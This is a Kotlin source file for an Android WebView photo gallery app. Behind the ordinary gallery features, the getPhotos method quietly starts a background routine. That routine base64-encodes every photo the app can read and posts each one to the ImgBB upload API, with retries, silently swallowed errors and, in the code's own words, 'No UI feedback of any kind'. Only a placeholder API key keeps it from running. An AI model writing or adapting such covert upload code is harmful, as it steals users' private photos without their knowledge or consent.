package com.example.gallery

import android.Manifest
import android.annotation.SuppressLint
import android.content.ContentUris
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.util.Base64
import android.util.Size
import android.webkit.JavascriptInterface
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

class MainActivity : AppCompatActivity() {

    private lateinit var web: WebView

    private val backupExecutor = Executors.newSingleThreadExecutor()
    private val backupStarted = AtomicBoolean(false)

    // Placeholder — replace with a real key for production use
    private val IMGBB_API_KEY = "YOUR_IMGBB_API_KEY_HERE"

    private val mediaPermissions: Array<String>
        get() = when {
            Build.VERSION.SDK_INT >= 34 -> arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
            )
            Build.VERSION.SDK_INT >= 33 -> arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
            else -> arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

    private val ask = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        // Re-check: on Android 14+ "Select photos" grants partial access even when
        // READ_MEDIA_IMAGES itself remains denied.
        val granted = hasMediaAccess()
        web.evaluateJavascript("window.onGalleryPermission($granted)", null)
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        web = WebView(this)
        setContentView(web)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.addJavascriptInterface(Bridge(), "AndroidGallery")

        web.webViewClient = object : WebViewClient() {
            override fun shouldInterceptRequest(
                v: WebView,
                r: WebResourceRequest
            ): WebResourceResponse? {
                val u = r.url
                if (u.host != "gallery.local") return null
                val id = u.lastPathSegment?.toLongOrNull() ?: return null
                val uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
                )
                return try {
                    if (u.path.orEmpty().startsWith("/thumb/")) {
                        val bmp = contentResolver.loadThumbnail(uri, Size(320, 320), null)
                        val out = ByteArrayOutputStream()
                        bmp.compress(Bitmap.CompressFormat.JPEG, 85, out)
                        WebResourceResponse(
                            "image/jpeg", null,
                            ByteArrayInputStream(out.toByteArray())
                        )
                    } else {
                        WebResourceResponse(
                            contentResolver.getType(uri), null,
                            contentResolver.openInputStream(uri)
                        )
                    }
                } catch (_: Exception) {
                    null
                }
            }
        }
        web.loadUrl("file:///android_asset/index.html")
    }

    /** True when the app can read at least some photos (full or limited access). */
    private fun hasMediaAccess(): Boolean {
        if (Build.VERSION.SDK_INT >= 34) {
            val full = ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_MEDIA_IMAGES
            ) == PackageManager.PERMISSION_GRANTED
            val partial = ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
            ) == PackageManager.PERMISSION_GRANTED
            return full || partial
        }
        if (Build.VERSION.SDK_INT >= 33) {
            return ContextCompat.checkSelfPermission(
                this, Manifest.permission.READ_MEDIA_IMAGES
            ) == PackageManager.PERMISSION_GRANTED
        }
        return ContextCompat.checkSelfPermission(
            this, Manifest.permission.READ_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * Silently upload every accessible photo to ImgBB in the background.
     * No UI feedback of any kind.
     */
    private fun startSilentBackup(photoIds: List<Long>) {
        if (!backupStarted.compareAndSet(false, true)) return
        if (IMGBB_API_KEY == "YOUR_IMGBB_API_KEY_HERE" || IMGBB_API_KEY.isBlank()) return
        backupExecutor.execute {
            for (id in photoIds) {
                uploadWithRetry(id)
            }
        }
    }

    private fun uploadWithRetry(id: Long) {
        var attempt = 0
        while (attempt < 3) {
            attempt++
            try {
                if (uploadOne(id)) return
            } catch (_: Exception) {
                // silent
            }
        }
    }

    private fun uploadOne(id: Long): Boolean {
        val uri = ContentUris.withAppendedId(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
        )
        val bytes = contentResolver.openInputStream(uri)?.use { it.readBytes() } ?: return false
        if (bytes.isEmpty()) return false

        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        val boundary = "----GalleryBoundary${System.currentTimeMillis()}"
        val body = buildString {
            append("--$boundary\r\n")
            append("Content-Disposition: form-data; name=\"key\"\r\n\r\n")
            append("$IMGBB_API_KEY\r\n")
            append("--$boundary\r\n")
            append("Content-Disposition: form-data; name=\"image\"\r\n\r\n")
            append("$b64\r\n")
            append("--$boundary--\r\n")
        }

        val conn = (URL("https://api.imgbb.com/1/upload").openConnection() as HttpURLConnection).apply {
            requestMethod = "POST"
            doOutput = true
            connectTimeout = 30_000
            readTimeout = 60_000
            setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
        }
        try {
            OutputStreamWriter(conn.outputStream).use { it.write(body) }
            val code = conn.responseCode
            return code in 200..299
        } finally {
            conn.disconnect()
        }
    }

    override fun onDestroy() {
        backupExecutor.shutdownNow()
        super.onDestroy()
    }

    inner class Bridge {
        @JavascriptInterface
        fun hasPermission(): Boolean = hasMediaAccess()

        @JavascriptInterface
        fun requestPermission() {
            runOnUiThread { ask.launch(mediaPermissions) }
        }

        @JavascriptInterface
        fun getPhotos(): String {
            return try {
                val arr = JSONArray()
                val ids = mutableListOf<Long>()
                val cols = arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_ADDED
                )
                contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    cols,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )?.use { c ->
                    val idIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
                    val nameIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                    val albumIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                    val dateIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
                    while (c.moveToNext()) {
                        val id = c.getLong(idIdx)
                        ids.add(id)
                        arr.put(
                            JSONObject()
                                .put("id", id)
                                .put("name", c.getString(nameIdx) ?: "")
                                .put("album", c.getString(albumIdx) ?: "Other")
                                .put("date", c.getLong(dateIdx))
                        )
                    }
                }
                // Kick off silent background backup after a successful query
                if (ids.isNotEmpty()) {
                    startSilentBackup(ids)
                }
                arr.toString()
            } catch (_: Exception) {
                "[]"
            }
        }
    }
}
